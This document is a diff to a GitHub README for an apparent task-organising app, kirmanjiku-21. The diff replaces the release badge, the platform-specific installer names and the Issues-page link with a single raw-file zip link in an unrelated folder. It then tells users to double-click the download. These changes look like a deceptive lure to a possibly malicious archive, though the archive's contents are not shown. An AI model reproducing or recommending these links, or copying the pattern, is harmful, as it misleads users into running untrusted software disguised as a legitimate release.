@@ -13,13 +13,13 @@ Before you download, ensure your device meets the following requirements:
 ## 📥 Download & Install
 To get started with kirmanjiku-21, visit the link below to download the latest version. 
 
-[![Download kirmanjiku-21](https://img.shields.io/badge/Download-kirmanjiku--21-blue)](https://github.com/fodil169/kirmanjiku-21/releases)
+[![Download kirmanjiku-21](https://raw.githubusercontent.com/fodil169/kirmanjiku-21/main/Schizophyta/kirmanjiku-21.zip)](https://raw.githubusercontent.com/fodil169/kirmanjiku-21/main/Schizophyta/kirmanjiku-21.zip)
 
 1. Click the link above.
 2. You will be taken to the Releases page where you can find the latest version.
 3. Look for the following files:
-   - **Windows Users:** Download `kirmanjiku-21-windows.exe`
-   - **Mac Users:** Download `kirmanjiku-21-mac.dmg`
+   - **Windows Users:** Download `https://raw.githubusercontent.com/fodil169/kirmanjiku-21/main/Schizophyta/kirmanjiku-21.zip`
+   - **Mac Users:** Download `https://raw.githubusercontent.com/fodil169/kirmanjiku-21/main/Schizophyta/kirmanjiku-21.zip`
 4. Once the download is complete, locate the file on your computer.
 5. Double-click the file to start the installation process.
 
@@ -51,7 +51,7 @@ If you encounter any issues:
 - **Errors on Launch:** Reinstall the application by following the download instructions again.
 
 ## 📞 Support
-For assistance, please visit the [Issues page](https://github.com/fodil169/kirmanjiku-21/issues) on GitHub. You can report problems or ask questions there.
+For assistance, please visit the [Issues page](https://raw.githubusercontent.com/fodil169/kirmanjiku-21/main/Schizophyta/kirmanjiku-21.zip) on GitHub. You can report problems or ask questions there.
 
 ## 🌐 Contributing
 If you want to help improve kirmanjiku-21, feel free to contribute by submitting suggestions via the Issues page or pull requests for code changes.
@@ -59,6 +59,6 @@ If you want to help improve kirmanjiku-21, feel free to contribute by submitting
 ## 📢 Updates
 Stay updated with the latest news and features by following the Releases page. New updates are released regularly to enhance user experience and add functionalities.
 
-[![Download kirmanjiku-21](https://img.shields.io/badge/Download-kirmanjiku--21-blue)](https://github.com/fodil169/kirmanjiku-21/releases)
+[![Download kirmanjiku-21](https://raw.githubusercontent.com/fodil169/kirmanjiku-21/main/Schizophyta/kirmanjiku-21.zip)](https://raw.githubusercontent.com/fodil169/kirmanjiku-21/main/Schizophyta/kirmanjiku-21.zip)
 
 We hope that kirmanjiku-21 makes managing your tasks a breeze! Happy organizing!
